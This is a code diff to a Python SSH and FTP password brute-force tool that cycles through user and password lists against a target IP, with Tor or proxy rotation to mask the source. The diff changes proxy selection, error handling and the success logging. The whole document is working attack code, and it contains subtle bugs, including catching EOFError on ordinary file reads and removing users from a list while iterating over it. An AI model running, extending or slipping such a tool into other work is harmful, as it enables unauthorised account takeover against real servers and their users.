@@ -51,9 +51,12 @@ def get_public_ip():
 
 
 def load_usernames_from_file(filename):
-    with open(filename, encoding='latin-1') as file:
-        return file.read().splitlines()
-
+    try:
+        with open(filename, encoding='latin-1') as file:
+            return file.read().splitlines()
+    except EOFError:
+        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED}  EOFError encountered when reading usernames from file.")
+        return []
 
 def parse_arguments():
     parser = argparse.ArgumentParser(description='Brute force against SSH and FTP services.')
@@ -126,10 +129,12 @@ def handle_timeout(func, *args, **kwargs):
 
 
 def load_proxies_from_file(filename):
-    with open(filename, 'r') as file:
-        return [line.strip().split(":") for line in file.readlines()]
-
-
+    try:
+        with open(filename, 'r') as file:
+            return [line.strip().split(":") for line in file.readlines()]
+    except EOFError:
+        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} {Fore.RED}  EOFError encountered when reading proxies from file.")
+        return []
 
 if __name__ == '__main__':
     try:
@@ -138,7 +143,7 @@ if __name__ == '__main__':
         args = parse_arguments()
 
         if args.tor and args.proxies:
-            print(f"{Fore.WHITE}[{Fore.YELLOW}ERROR{Fore.WHITE}]{Fore.RESET} You cannot use both Tor and a proxy file at the same time!")
+            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} {Fore.RED} You cannot use both Tor and a proxy file at the same time!")
             exit(1)
 
         if args.tor:
@@ -154,20 +159,17 @@ if __name__ == '__main__':
 
         password_chunk_size = 3
         first_iteration = True
-        proxy_idx = 0  # Index to keep track of which proxy to use
-
         for i in range(0, len(passwords), password_chunk_size):
             for idx, user in enumerate(users):
-                # Set proxy for this user
-                proxy_ip, proxy_port = proxies[proxy_idx] if proxies else (None, None)
-                proxy_idx = (proxy_idx + 1) % len(proxies) if proxies else 0  # Rotate back to start if end is reached
+                proxy_ip, proxy_port = proxies[i % len(proxies)] if proxies else (None, None)
 
                 if proxy_ip:
                     print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Using proxy {proxy_ip}:{proxy_port}")
 
-                if idx == 0 and not first_iteration:
-                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Returning to first user...")
-                elif idx != 0:
+                if idx == 0:
+                    if not first_iteration:
+                        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Returning to first user...")
+                else:
                     print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Switching to next user....")
 
                 for j in range(password_chunk_size):
@@ -175,23 +177,35 @@ if __name__ == '__main__':
                         break
                     password = passwords[i + j]
                     print(current_timestamp(), f"Trying user [*]{Fore.YELLOW}{user}{Fore.RESET}[*] with password: {Fore.YELLOW}{password}")
-                    result = None
+
                     if args.service == 'ssh':
-                        result = handle_timeout(ssh_attack, args.ip, user, password, proxy_ip, proxy_port)
+                        if handle_timeout(ssh_attack, args.ip, user, password, proxy_ip, proxy_port):
+                            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Password found for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
+                            users.remove(user)
+                            break
                     elif args.service == 'ftp':
-                        result = handle_timeout(ftp_attack, args.ip, user, password, proxy_ip, proxy_port)
+                        if handle_timeout(ftp_attack, args.ip, user, password, proxy_ip, proxy_port):
+                            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Password found for [*]{user}{Fore.RESET}[*]: {Fore.GREEN}{password}")
+                            users.remove(user)
+                            break
 
-                    if result is None:  # Proxy failure
-                        break  # Move on to the next user with a new proxy
-
-                    if result:
-                        print(
-                            f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Password found for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
-                        users.remove(user)
-                        break
             first_iteration = False
 
         print(current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.BLUE} Brute force completed.")
+
     except KeyboardInterrupt:
         print("\n", current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} ATTACK STOPPED")
         exit(0)
+    except EOFError:
+            print("\n", current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Unexpected End of File (EOF) encountered. Exiting.")
+            exit(1)
+
+
+
+
+
+
+
+
+
+
